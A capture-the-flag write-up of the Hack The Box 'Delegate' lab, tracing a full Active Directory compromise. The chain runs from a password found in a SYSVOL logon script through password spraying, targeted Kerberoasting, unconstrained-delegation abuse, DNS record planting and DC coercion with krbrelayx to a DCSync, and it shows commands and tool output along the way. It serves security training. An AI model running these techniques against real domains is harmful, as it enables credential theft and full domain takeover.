# Delegate — Hack The Box, Medium, Windows

*Windows Server 2022 domain controller. Starting position: one IP address.*

Flags are redacted. Everything else is as it happened, including the two wrong turns.

---

## What the box gives you

A full-range TCP sweep returns nothing but the Active Directory service set — DNS,
Kerberos, RPC, LDAP, SMB, the global catalog, RDP, WinRM, ADWS and the ephemeral RPC
range. No web server, no database, no odd port. That is worth pausing on, because the
usual heuristic ("the one non-standard port is the path") has nothing to bite on. When a
DC exposes only the AD ports, the path *is* AD, and the enumeration order is fixed:
anonymous SMB, then anonymous LDAP, then whatever the first credential opens.

`nxc smb` fingerprints the host as `DC1.delegate.vl` and reports `Null Auth: True`. A null
session gets a bind but no share list. Guest, however, is enabled:

```
SMB  10.129.x.x  445  DC1  [+] delegate.vl\guest:
SMB  10.129.x.x  445  DC1  IPC$      READ
SMB  10.129.x.x  445  DC1  NETLOGON  READ
SMB  10.129.x.x  445  DC1  SYSVOL    READ
```

An enabled Guest account with SYSVOL read is a fully unauthenticated view of everything a
domain publishes to its clients. RID cycling through SAMR as Guest gives the whole
principal list — five human accounts and one group whose name is a rather loud hint:

```
1104: DELEGATE\A.Briggs      1107: DELEGATE\J.Roberts
1105: DELEGATE\b.Brown       1108: DELEGATE\N.Thompson
1106: DELEGATE\R.Cooper      1121: DELEGATE\delegation admins
```

AS-REP roasting the list first (it costs one command and needs no credential) returns
nothing — no account has pre-authentication disabled. So: SYSVOL.

## A password in a batch file

`SYSVOL\delegate.vl\scripts\` holds exactly one file, `users.bat`, 159 bytes:

```bat
rem @echo off
net use * /delete /y
net use v: \\dc1\development

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```

A logon script mapping a drive with a hard-coded credential — the oldest finding in
Windows administration, and still the most common way a lab hands you your first account.
The `/user:Administrator` is a deliberate misdirection: the password is not the domain
Administrator's. Sprayed once per account across the user list, it is A.Briggs's:

```
[+] delegate.vl\A.Briggs:P4ssw0rd1#123
```

(One attempt per account, one password. The lockout policy is unknown until you can read
it, and a locked account is not merely a delay — it can close the intended path for the
rest of the engagement.)

## One ACL edge

A.Briggs is in no groups beyond Domain Users and can see no extra shares. BloodHound
collected as A.Briggs returns a domain with exactly one interesting non-default ACE:

```
A.BRIGGS  --GenericWrite-->  N.THOMPSON
```

and N.Thompson is a member of two groups that matter: `delegation admins`, and
`Remote Management Users` — which means N.Thompson can open a WinRM shell.

`GenericWrite` over a user has two standard conversions. The faster one is a **shadow
credential**: write `msDS-KeyCredentialLink`, then authenticate with PKINIT and recover the
NT hash without cracking anything. That needs a certificate authority for PKINIT to work
at all, and `certipy find` reports the forest has none — zero CAs, zero templates. Ruling
that out with a command rather than an assumption is worth the ninety seconds; it is also
the reason the slower route was the right one rather than a lazy one.

The slower route is a **targeted Kerberoast**. Write a service principal name onto the
victim, ask the KDC for a service ticket encrypted with that account's key, crack it
offline, remove the SPN:

```
bloodyAD ... set object N.Thompson servicePrincipalName -v "http/pwnsvc1"
impacket-GetUserSPNs ... -request-user N.Thompson
john --format=krb5tgs ...
```

Two seconds against `rockyou`. The SPN goes straight back off the object afterwards —
it is an artifact, and leaving it there is both untidy and a detection you handed the
defender for free.

WinRM as `n.thompson` gives the first interactive shell, and `user.txt`.

## The actual machine

`whoami /all` is the whole box:

```
DELEGATE\delegation admins        Group

SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
```

`SeEnableDelegationPrivilege` is not the right to *use* delegation. It is the right to
*define* it — to mark an account as trusted to act on behalf of others. Microsoft's own
documentation notes that granting it outside Domain Admins allows an attacker to
impersonate anyone. Combined with `SeMachineAccountPrivilege` and a MachineAccountQuota of
10, the holder can create their own principal and then declare that principal trustworthy.

There are two flavours to reach for, and it is worth understanding why the obvious one
fails here.

### The wrong turn: constrained delegation

Constrained delegation with protocol transition is the cleaner attack: set
`msDS-AllowedToDelegateTo` to `cifs/dc1.delegate.vl`, set
`TRUSTED_TO_AUTH_FOR_DELEGATION`, then S4U2Self + S4U2Proxy your way to a CIFS ticket as
Administrator. It needs no callback and no coercion — everything happens on the attacker's
side.

Create a machine account, and:

```
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] added to PWNSVC01$'s userAccountControl
LDAPModifyException: insufficientAccessRights for CN=PWNSVC01 ... ERROR_DS_INSUFF_ACCESS_RIGHTS
```

The UAC bit writes; `msDS-AllowedToDelegateTo` does not. Dumping the object's DACL
explains it — the creator of a machine account gets `WriteProperty` on a handful of
*property sets* (Account Restrictions, which contains `userAccountControl`; Logon
Information; DNS Host Name; description; displayName) and nothing else. The owner is
Domain Admins, so there is no `WriteDacl` fallback. Creating the account over LDAP instead
of SAMR, on the theory that the creator would become the owner, produces the same refusal.

And going the other way — writing the attribute on N.Thompson, where A.Briggs *does* have
unrestricted `WriteProperty` — fails differently and more informatively:

```
ERROR_PRIVILEGE_NOT_HELD
```

Two principals, two halves of the requirement, and no way to hold both at once: A.Briggs
has the access rights but not the privilege; N.Thompson has the privilege but not the
rights. That is not an accident of the lab, it is how AD is designed — the delegation
attributes are guarded by a privilege check *in addition to* the DACL.

### The right flavour: unconstrained delegation

Unconstrained delegation needs only a `userAccountControl` bit — `TRUSTED_FOR_DELEGATION`
— and that bit lives in the Account Restrictions property set, which the machine account's
creator *can* write. So the narrower control did not reduce the outcome at all; it only
selected which flavour was available.

```
[+] ['TRUSTED_FOR_DELEGATION'] added to PWNSVC01$'s userAccountControl
```

The rest is the classic shape. An account trusted for unconstrained delegation receives a
copy of the TGT of anyone who authenticates to it. So: make the fake host resolvable
(ADIDNS lets any authenticated user create an A record — it takes about ninety seconds to
be served), stand up a listener holding the machine account's Kerberos key, and coerce the
domain controller into authenticating to it.

## Two hours of self-inflicted debugging

This is the part worth reading, because neither problem was the box's.

**First**, `printerbug.py` returned `RPC_S_SERVER_UNAVAILABLE` — the spooler is off — and
`coercer` with MS-EFSR returned `ERROR_BAD_NETPATH` on every method while the listener saw
nothing. Testing outbound reachability from the DC over the WinRM shell:

```
(Test-NetConnection 10.10.14.x -Port 445).TcpTestSucceeded  ->  False
(Test-NetConnection 10.10.14.x -Port 80).TcpTestSucceeded   ->  False
```

Egress blocked, apparently. That reading was wrong, and wrong in an expensive way: the
test ran when nothing was listening on those ports. A closed port and a filtered port look
identical from `Test-NetConnection`. Re-running the same sweep with a trivial multi-port
Python listener actually bound:

```
HIT 445 ('10.129.x.x', 63218)
HIT 80  ('10.129.x.x', 63229)
HIT 443 ('10.129.x.x', 63239)
HIT 8080('10.129.x.x', 54354)
```

Egress was never blocked. An egress test is only valid against a socket that is *accepting*.

**Second**, with reachability proven, `krbrelayx.py` still logged nothing — and `ss` showed
nothing bound on 445, despite the tool printing `Servers started, waiting for connections`
and exiting cleanly with status 0 in under a second. The cause is that impacket's relay
tools block on `sys.stdin.readline()` in their main loop; every listening socket is a
daemon thread. Run one through a non-interactive container exec, stdin is at EOF, the read
returns immediately, the main thread ends and the daemon threads die with it. The
listener genuinely was never up.

```
tail -f /dev/null | python3 -u /opt/krbrelayx/krbrelayx.py ...
```

Holding stdin open fixes it, and `ss -lntp` showing the bind is the proof, not the banner.

And **third**, a smaller one that cost a restart: `pkill -f "opt/krbrelayx/krbrelayx"`
killed the shell that was about to launch krbrelayx, because that shell's own command line
contained the pattern. Kill by PID.

## The DC hands over its TGT

With the listener actually listening, the coercion lands — and immediately reveals one more
detail:

```
[-] Could not find the correct encryption key! Ticket is encrypted with keytype 23,
    but keytype(s) 18 were supplied
```

The machine account's password was set by the attacker, and the DC issued the ticket with
RC4 rather than AES. Supplying the RC4 (NT) hash of the same password instead of the AES256
key:

```
[*] SMBD: Received connection from 10.129.x.x
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

That is the domain controller's own ticket-granting ticket. Loading it into `KRB5CCNAME`
and pointing `secretsdump` at DRSUAPI is DCSync:

```
Administrator:500:<administrator-nt-hash>:::
```

`root.txt` over SMB with that hash.

## Afterwards

Cleanup, in reverse order of creation and verified rather than assumed: the ADIDNS record
tombstoned, both machine accounts deleted, the SPN already off N.Thompson. A final LDAP
query confirms `DC1$` is the only computer object left in the domain and that N.Thompson
carries neither an SPN nor a delegation attribute.

## What the box is actually teaching

The hygiene findings — Guest enabled, a password in a logon script, a password in
`rockyou` — are what get you a shell. They are also what most write-ups spend their time
on, and they are the least interesting part.

The finding that decides the outcome is a *privilege that was deliberately delegated*:
`SeEnableDelegationPrivilege`, handed to a group called `delegation admins`, presumably by
an administrator who read the name and thought it described a job. It is not a permission
to perform delegation. It is a permission to declare which accounts the KDC should trust
with other people's tickets, and there is no configuration of it that is not equivalent to
Domain Admin.

The second lesson is methodological and cost more time than the box did: **a negative
result from a probe is only evidence if the probe was capable of returning a positive
one.** "Outbound 445 is blocked" was concluded from a test with no socket listening, and
"the coercion isn't working" was concluded from a listener that had already exited. Both
readings were confidently wrong, and both were resolved by the same discipline — prove the
instrument works before trusting what it says about the target.
